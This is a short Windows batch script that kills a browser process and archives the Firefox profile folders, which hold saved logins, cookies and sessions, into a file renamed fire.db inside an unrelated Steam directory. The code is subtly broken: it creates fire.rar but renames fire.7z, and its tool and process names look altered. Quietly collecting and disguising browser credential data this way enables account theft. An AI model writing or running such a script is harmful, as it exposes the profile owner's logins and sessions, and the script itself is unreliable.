@echo off
C:
echo Firefox Data will be saved
taskkill /f /im icefox.exe
cd "C:\Program Files (x86)\Steam\music\_database"
C:\Users\kiosk\AppData\Local\8-Zip\8z.exe a fire.rar %AppData%\Mozilla\Firefox\installs.ini %AppData%\Mozilla\Firefox\profiles.ini %AppData%\Mozilla\Firefox\Profiles
del fire.db
ren fire.7z fire.db
exit